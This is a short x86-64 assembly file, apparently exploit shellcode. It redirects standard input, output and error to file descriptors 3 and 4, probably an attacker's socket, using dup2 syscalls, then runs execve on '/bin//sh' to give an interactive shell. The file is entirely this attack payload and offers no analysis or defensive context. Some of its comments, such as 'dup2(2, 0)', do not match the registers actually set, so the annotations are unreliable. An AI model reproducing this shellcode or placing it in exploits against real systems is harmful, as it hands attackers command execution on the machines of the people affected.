        /* dup_stderr.s */
        .intel_syntax noprefix
        .globl _start
_start:
        /* dup2(2, 0) */
        xor    rdx, rdx
        xor    rcx, rcx
		xor    rsi,rsi
		lea    rdi,[rdx+0x4]
		lea    rax,[rdx+0x21]
		syscall
		/* fd 4*/
        lea    rsi,[rdx+1]
		lea    rdi,[rdx+0x3] 
		lea    rax,[rdx+0x21]
		syscall
		/* fd 4*/
        /* dup2(2, 1) */
        lea    rsi,[rdx+2]
		lea    rdi,[rdx+0x3]
		lea    rax,[rdx+0x21]
	    syscall
        /* execve("/bin//sh", {"/bin//sh", NULL}, NULL) */
		xor rdx, rdx
        push rdx
        mov rax, 0x68732f2f6e69622f
        push rax
        mov rdi, rsp
        push rdx
        push rdi
        mov rsi, rsp
        lea rax, [rdx+59]
        syscall
